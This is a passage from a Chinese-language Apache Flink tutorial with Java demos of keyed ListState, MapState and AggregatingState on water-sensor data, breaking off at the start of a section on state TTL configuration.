class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KeyedListStateDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction())</span><br><span class="line">                .assignTimestampsAndWatermarks(</span><br><span class="line">                        WatermarkStrategy</span><br><span class="line">                                .&lt;WaterSensor&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">3</span>))</span><br><span class="line">                                .withTimestampAssigner((element, ts) -&gt; element.getTs() * <span class="number">1000L</span>)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        sensorDS.keyBy(r -&gt; r.getId())</span><br><span class="line">                .process(</span><br><span class="line">                        <span class="keyword">new</span> KeyedProcessFunction&lt;String, WaterSensor, String&gt;() &#123;</span><br><span class="line"></span><br><span class="line">                            ListState&lt;Integer&gt; vcListState;</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="keyword">super</span>.open(parameters);</span><br><span class="line">                                vcListState = getRuntimeContext().getListState(<span class="keyword">new</span> ListStateDescriptor&lt;Integer&gt;(<span class="string">"vcListState"</span>, Types.INT));</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(WaterSensor value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="comment">// 1.来一条，存到list状态里</span></span><br><span class="line">                                vcListState.add(value.getVc());</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// 2.从list状态拿出来(Iterable)， 拷贝到一个List中，排序， 只留3个最大的</span></span><br><span class="line">                                Iterable&lt;Integer&gt; vcListIt = vcListState.get();</span><br><span class="line">                                <span class="comment">// 2.1 拷贝到List中</span></span><br><span class="line">                                List&lt;Integer&gt; vcList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                                <span class="keyword">for</span> (Integer vc : vcListIt) &#123;</span><br><span class="line">                                    vcList.add(vc);</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="comment">// 2.2 对List进行降序排序</span></span><br><span class="line">                                vcList.sort((o1, o2) -&gt; o2 - o1);</span><br><span class="line">                                <span class="comment">// 2.3 只保留最大的3个(list中的个数一定是连续变大，一超过3就立即清理即可)</span></span><br><span class="line">                                <span class="keyword">if</span> (vcList.size() &gt; <span class="number">3</span>) &#123;</span><br><span class="line">                                    <span class="comment">// 将最后一个元素清除（第4个）</span></span><br><span class="line">                                    vcList.remove(<span class="number">3</span>);</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                out.collect(<span class="string">"传感器id为"</span> + value.getId() + <span class="string">",最大的3个水位值="</span> + vcList.toString());</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// 3.更新list状态</span></span><br><span class="line">                                vcListState.update(vcList);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//                                vcListState.get();            //取出 list状态 本组的数据，是一个Iterable</span></span><br><span class="line"><span class="comment">//                                vcListState.add();            // 向 list状态 本组 添加一个元素</span></span><br><span class="line"><span class="comment">//                                vcListState.addAll();         // 向 list状态 本组 添加多个元素</span></span><br><span class="line"><span class="comment">//                                vcListState.update();         // 更新 list状态 本组数据（覆盖）</span></span><br><span class="line"><span class="comment">//                                vcListState.clear();          // 清空List状态 本组数据</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                )</span><br><span class="line">                .print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-Map状态（MapState）">2.3 Map状态（MapState）</h3><p>把一些键值对（key-value）作为状态整体保存起来，可以认为就是一组key-value映射的列表。对应的MapState&lt;UK, UV&gt;接口中，就会有UK、UV两个泛型，分别表示保存的key和value的类型。同样，MapState提供了操作映射状态的方法，与Map的使用非常类似</p><ul><li>UV get(UK key)：传入一个key作为参数，查询对应的value值；</li><li>put(UK key, UV value)：传入一个键值对，更新key对应的value值；</li><li>putAll(Map&lt;UK, UV&gt; map)：将传入的映射map中所有的键值对，全部添加到映射状态中；</li><li>remove(UK key)：将指定key对应的键值对删除；</li><li>boolean contains(UK key)：判断是否存在指定的key，返回一个boolean值。</li></ul><p>另外，MapState也提供了获取整个映射相关信息的方法；</p><ul><li>Iterable&lt;Map.Entry&lt;UK, UV&gt;&gt; entries()：获取映射状态中所有的键值对；</li><li>Iterable&lt;UK&gt; keys()：获取映射状态中所有的键（key），返回一个可迭代Iterable类型；</li><li>Iterable&lt;UV&gt; values()：获取映射状态中所有的值（value），返回一个可迭代Iterable类型；</li><li>boolean isEmpty()：判断映射是否为空，返回一个boolean值</li></ul><p>**案例需求：**统计每种传感器每种水位值出现的次数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KeyedMapStateDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction())</span><br><span class="line">                .assignTimestampsAndWatermarks(</span><br><span class="line">                        WatermarkStrategy</span><br><span class="line">                                .&lt;WaterSensor&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">3</span>))</span><br><span class="line">                                .withTimestampAssigner((element, ts) -&gt; element.getTs() * <span class="number">1000L</span>)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        sensorDS.keyBy(r -&gt; r.getId())</span><br><span class="line">                .process(</span><br><span class="line">                        <span class="keyword">new</span> KeyedProcessFunction&lt;String, WaterSensor, String&gt;() &#123;</span><br><span class="line"></span><br><span class="line">                            MapState&lt;Integer, Integer&gt; vcCountMapState;</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="keyword">super</span>.open(parameters);</span><br><span class="line">                                vcCountMapState = getRuntimeContext().getMapState(<span class="keyword">new</span> MapStateDescriptor&lt;Integer, Integer&gt;(<span class="string">"vcCountMapState"</span>, Types.INT, Types.INT));</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(WaterSensor value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="comment">// 1.判断是否存在vc对应的key</span></span><br><span class="line">                                Integer vc = value.getVc();</span><br><span class="line">                                <span class="keyword">if</span> (vcCountMapState.contains(vc)) &#123;</span><br><span class="line">                                    <span class="comment">// 1.1 如果包含这个vc的key，直接对value+1</span></span><br><span class="line">                                    Integer count = vcCountMapState.get(vc);</span><br><span class="line">                                    vcCountMapState.put(vc, ++count);</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="comment">// 1.2 如果不包含这个vc的key，初始化put进去</span></span><br><span class="line">                                    vcCountMapState.put(vc, <span class="number">1</span>);</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// 2.遍历Map状态，输出每个k-v的值</span></span><br><span class="line">                                StringBuilder outStr = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                                outStr.append(<span class="string">"======================================\n"</span>);</span><br><span class="line">                                outStr.append(<span class="string">"传感器id为"</span> + value.getId() + <span class="string">"\n"</span>);</span><br><span class="line">                                <span class="keyword">for</span> (Map.Entry&lt;Integer, Integer&gt; vcCount : vcCountMapState.entries()) &#123;</span><br><span class="line">                                    outStr.append(vcCount.toString() + <span class="string">"\n"</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                                outStr.append(<span class="string">"======================================\n"</span>);</span><br><span class="line"></span><br><span class="line">                                out.collect(outStr.toString());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//                                vcCountMapState.get();          // 对本组的Map状态，根据key，获取value</span></span><br><span class="line"><span class="comment">//                                vcCountMapState.contains();     // 对本组的Map状态，判断key是否存在</span></span><br><span class="line"><span class="comment">//                                vcCountMapState.put(, );        // 对本组的Map状态，添加一个 键值对</span></span><br><span class="line"><span class="comment">//                                vcCountMapState.putAll();  // 对本组的Map状态，添加多个 键值对</span></span><br><span class="line"><span class="comment">//                                vcCountMapState.entries();      // 对本组的Map状态，获取所有键值对</span></span><br><span class="line"><span class="comment">//                                vcCountMapState.keys();         // 对本组的Map状态，获取所有键</span></span><br><span class="line"><span class="comment">//                                vcCountMapState.values();       // 对本组的Map状态，获取所有值</span></span><br><span class="line"><span class="comment">//                                vcCountMapState.remove();   // 对本组的Map状态，根据指定key，移除键值对</span></span><br><span class="line"><span class="comment">//                                vcCountMapState.isEmpty();      // 对本组的Map状态，判断是否为空</span></span><br><span class="line"><span class="comment">//                                vcCountMapState.iterator();     // 对本组的Map状态，获取迭代器</span></span><br><span class="line"><span class="comment">//                                vcCountMapState.clear();        // 对本组的Map状态，清空</span></span><br><span class="line"></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                )</span><br><span class="line">                .print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-4-归约状态（ReducingState）">2.4 归约状态（ReducingState）</h3><p>**案例需求：**计算每种传感器的平均水位</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KeyedAggregatingStateDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction())</span><br><span class="line">                .assignTimestampsAndWatermarks(</span><br><span class="line">                        WatermarkStrategy</span><br><span class="line">                                .&lt;WaterSensor&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">3</span>))</span><br><span class="line">                                .withTimestampAssigner((element, ts) -&gt; element.getTs() * <span class="number">1000L</span>)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        sensorDS.keyBy(r -&gt; r.getId())</span><br><span class="line">                .process(</span><br><span class="line">                        <span class="keyword">new</span> KeyedProcessFunction&lt;String, WaterSensor, String&gt;() &#123;</span><br><span class="line"></span><br><span class="line">                            AggregatingState&lt;Integer, Double&gt; vcAvgAggregatingState;</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="keyword">super</span>.open(parameters);</span><br><span class="line">                                vcAvgAggregatingState = getRuntimeContext()</span><br><span class="line">                                        .getAggregatingState(</span><br><span class="line">                                                <span class="keyword">new</span> AggregatingStateDescriptor&lt;Integer, Tuple2&lt;Integer, Integer&gt;, Double&gt;(</span><br><span class="line">                                                        <span class="string">"vcAvgAggregatingState"</span>,</span><br><span class="line">                                                        <span class="keyword">new</span> AggregateFunction&lt;Integer, Tuple2&lt;Integer, Integer&gt;, Double&gt;() &#123;</span><br><span class="line">                                                            <span class="meta">@Override</span></span><br><span class="line">                                                            <span class="function"><span class="keyword">public</span> Tuple2&lt;Integer, Integer&gt; <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                                                                <span class="keyword">return</span> Tuple2.of(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">                                                            &#125;</span><br><span class="line"></span><br><span class="line">                                                            <span class="meta">@Override</span></span><br><span class="line">                                                            <span class="function"><span class="keyword">public</span> Tuple2&lt;Integer, Integer&gt; <span class="title">add</span><span class="params">(Integer value, Tuple2&lt;Integer, Integer&gt; accumulator)</span> </span>&#123;</span><br><span class="line">                                                                <span class="keyword">return</span> Tuple2.of(accumulator.f0 + value, accumulator.f1 + <span class="number">1</span>);</span><br><span class="line">                                                            &#125;</span><br><span class="line"></span><br><span class="line">                                                            <span class="meta">@Override</span></span><br><span class="line">                                                            <span class="function"><span class="keyword">public</span> Double <span class="title">getResult</span><span class="params">(Tuple2&lt;Integer, Integer&gt; accumulator)</span> </span>&#123;</span><br><span class="line">                                                                <span class="keyword">return</span> accumulator.f0 * <span class="number">1</span>D / accumulator.f1;</span><br><span class="line">                                                            &#125;</span><br><span class="line"></span><br><span class="line">                                                            <span class="meta">@Override</span></span><br><span class="line">                                                            <span class="function"><span class="keyword">public</span> Tuple2&lt;Integer, Integer&gt; <span class="title">merge</span><span class="params">(Tuple2&lt;Integer, Integer&gt; a, Tuple2&lt;Integer, Integer&gt; b)</span> </span>&#123;</span><br><span class="line"><span class="comment">//                                                                return Tuple2.of(a.f0 + b.f0, a.f1 + b.f1);</span></span><br><span class="line">                                                                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                                                            &#125;</span><br><span class="line">                                                        &#125;,</span><br><span class="line">                                                        Types.TUPLE(Types.INT, Types.INT))</span><br><span class="line">                                        );</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(WaterSensor value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="comment">// 将 水位值 添加到  聚合状态中</span></span><br><span class="line">                                vcAvgAggregatingState.add(value.getVc());</span><br><span class="line">                                <span class="comment">// 从 聚合状态中 获取结果</span></span><br><span class="line">                                Double vcAvg = vcAvgAggregatingState.get();</span><br><span class="line"></span><br><span class="line">                                out.collect(<span class="string">"传感器id为"</span> + value.getId() + <span class="string">",平均水位值="</span> + vcAvg);</span><br><span class="line"></span><br><span class="line"><span class="comment">//                                vcAvgAggregatingState.get();    // 对 本组的聚合状态 获取结果</span></span><br><span class="line"><span class="comment">//                                vcAvgAggregatingState.add();    // 对 本组的聚合状态 添加数据，会自动进行聚合</span></span><br><span class="line"><span class="comment">//                                vcAvgAggregatingState.clear();  // 对 本组的聚合状态 清空数据</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                )</span><br><span class="line">                .print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-5-聚合状态（AggregatingState）">2.5 聚合状态（AggregatingState）</h3><p>**案例需求：**计算每种传感器的平均水位</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KeyedAggregatingStateDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction())</span><br><span class="line">                .assignTimestampsAndWatermarks(</span><br><span class="line">                        WatermarkStrategy</span><br><span class="line">                                .&lt;WaterSensor&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">3</span>))</span><br><span class="line">                                .withTimestampAssigner((element, ts) -&gt; element.getTs() * <span class="number">1000L</span>)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        sensorDS.keyBy(r -&gt; r.getId())</span><br><span class="line">                .process(</span><br><span class="line">                        <span class="keyword">new</span> KeyedProcessFunction&lt;String, WaterSensor, String&gt;() &#123;</span><br><span class="line"></span><br><span class="line">                            AggregatingState&lt;Integer, Double&gt; vcAvgAggregatingState;</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="keyword">super</span>.open(parameters);</span><br><span class="line">                                vcAvgAggregatingState = getRuntimeContext()</span><br><span class="line">                                        .getAggregatingState(</span><br><span class="line">                                                <span class="keyword">new</span> AggregatingStateDescriptor&lt;Integer, Tuple2&lt;Integer, Integer&gt;, Double&gt;(</span><br><span class="line">                                                        <span class="string">"vcAvgAggregatingState"</span>,</span><br><span class="line">                                                        <span class="keyword">new</span> AggregateFunction&lt;Integer, Tuple2&lt;Integer, Integer&gt;, Double&gt;() &#123;</span><br><span class="line">                                                            <span class="meta">@Override</span></span><br><span class="line">                                                            <span class="function"><span class="keyword">public</span> Tuple2&lt;Integer, Integer&gt; <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                                                                <span class="keyword">return</span> Tuple2.of(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">                                                            &#125;</span><br><span class="line"></span><br><span class="line">                                                            <span class="meta">@Override</span></span><br><span class="line">                                                            <span class="function"><span class="keyword">public</span> Tuple2&lt;Integer, Integer&gt; <span class="title">add</span><span class="params">(Integer value, Tuple2&lt;Integer, Integer&gt; accumulator)</span> </span>&#123;</span><br><span class="line">                                                                <span class="keyword">return</span> Tuple2.of(accumulator.f0 + value, accumulator.f1 + <span class="number">1</span>);</span><br><span class="line">                                                            &#125;</span><br><span class="line"></span><br><span class="line">                                                            <span class="meta">@Override</span></span><br><span class="line">                                                            <span class="function"><span class="keyword">public</span> Double <span class="title">getResult</span><span class="params">(Tuple2&lt;Integer, Integer&gt; accumulator)</span> </span>&#123;</span><br><span class="line">                                                                <span class="keyword">return</span> accumulator.f0 * <span class="number">1</span>D / accumulator.f1;</span><br><span class="line">                                                            &#125;</span><br><span class="line"></span><br><span class="line">                                                            <span class="meta">@Override</span></span><br><span class="line">                                                            <span class="function"><span class="keyword">public</span> Tuple2&lt;Integer, Integer&gt; <span class="title">merge</span><span class="params">(Tuple2&lt;Integer, Integer&gt; a, Tuple2&lt;Integer, Integer&gt; b)</span> </span>&#123;</span><br><span class="line"><span class="comment">//                                                                return Tuple2.of(a.f0 + b.f0, a.f1 + b.f1);</span></span><br><span class="line">                                                                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                                                            &#125;</span><br><span class="line">                                                        &#125;,</span><br><span class="line">                                                        Types.TUPLE(Types.INT, Types.INT))</span><br><span class="line">                                        );</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(WaterSensor value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="comment">// 将 水位值 添加到  聚合状态中</span></span><br><span class="line">                                vcAvgAggregatingState.add(value.getVc());</span><br><span class="line">                                <span class="comment">// 从 聚合状态中 获取结果</span></span><br><span class="line">                                Double vcAvg = vcAvgAggregatingState.get();</span><br><span class="line"></span><br><span class="line">                                out.collect(<span class="string">"传感器id为"</span> + value.getId() + <span class="string">",平均水位值="</span> + vcAvg);</span><br><span class="line"></span><br><span class="line"><span class="comment">//                                vcAvgAggregatingState.get();    // 对 本组的聚合状态 获取结果</span></span><br><span class="line"><span class="comment">//                                vcAvgAggregatingState.add();    // 对 本组的聚合状态 添加数据，会自动进行聚合</span></span><br><span class="line"><span class="comment">//                                vcAvgAggregatingState.clear();  // 对 本组的聚合状态 清空数据</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                )</span><br><span class="line">                .print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-6-状态生存时间（TTL）">2.6 状态生存时间（TTL）</h3><p>在实际应用中，很多状态会随着时间的推移逐渐增长，如果不加以限制，最终就会导致存储空间的耗尽。一个优化的思路是直接在代码中调用.clear()方法去清除状态，但是有时候我们的逻辑要求不能直接清除。这时就需要配置一个状态的“生存时间”（time-to-live，TTL），当状态在内存中存在的时间超出这个值时，就将它清除。</p><p>具体实现上，如果用一个进程不停地扫描所有状态看是否过期，显然会占用大量资源做无用功。状态的失效其实不需要立即删除，所以我们可以给状态附加一个属性，也就是状态的“失效时间”。状态创建的时候，设置 失效时间 = 当前时间 + TTL；之后如果有对状态的访问和修改，我们可以再对失效时间进行更新；当设置的清除条件被触发时（比如，状态被访问的时候，或者每隔一段时间扫描一次失效状态），就可以判断状态是否失效、从而进行清除了。</p><p>配置状态的TTL时，需要创建一个StateTtlConfig配置对象，然后调用状态描述器的.enableTimeToLive()方法启动TTL功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">StateTtlConfig ttlConfig = StateTtlConfig</span><br><span class="line">    .newBuilder(Time.seconds(<span class="number">10</span>))</span><br><span class="line">    .setUpdateType(StateTtlConfig.UpdateType.OnCreateAndWrite)</span><br><span class="line">    .setStateVisibility(StateTtlConfig.StateVisibility.NeverReturnExpired)</span><br><span class="line">    .build();</span><br><span class="line"></span><br><span class="line">ValueStateDescriptor&lt;String&gt; stateDescriptor = <span class="keyword">new</span> ValueStateDescriptor&lt;&gt;(<span class="string">"my state"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span 